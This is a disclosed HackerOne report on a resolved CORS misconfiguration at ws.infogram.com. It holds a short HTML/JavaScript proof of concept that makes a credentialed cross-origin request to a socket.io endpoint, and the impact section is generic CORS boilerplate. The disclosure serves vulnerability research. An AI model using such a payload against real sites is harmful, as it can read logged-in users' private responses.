---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '372452'
original_report_id: '372452'
title: CORS on (ws.infogram.com)
weakness: Improper Access Control - Generic
team_handle: infogram
created_at: '2018-06-28T16:31:36.887Z'
disclosed_at: '2018-10-08T08:20:46.193Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 11
asset_identifier: infogram.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- improper-access-control-generic
---

# CORS on (ws.infogram.com)

## Metadata

- HackerOne Report ID: 372452
- Weakness: Improper Access Control - Generic
- Program: infogram
- Disclosed At: 2018-10-08T08:20:46.193Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hey Team i don't know if it's valid or not i just want to let you know about this thanks.
```````````
Exploit
``````````````````
<html>
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ws.infogram.com/socket.io/?EIO=3&transport=polling&t=MH7BU79',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
</html>

## Impact

As with superpowers, it’s all about knowing how to use it. Therefore, CORS is not necessarily a bad thing. We’ve seen in many cases that CORS has legitimate use, and this is why it was invented and made a web standard in the first place. However, you need to be aware of the CORS configuration you set up in your server and the side effects this has on security.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
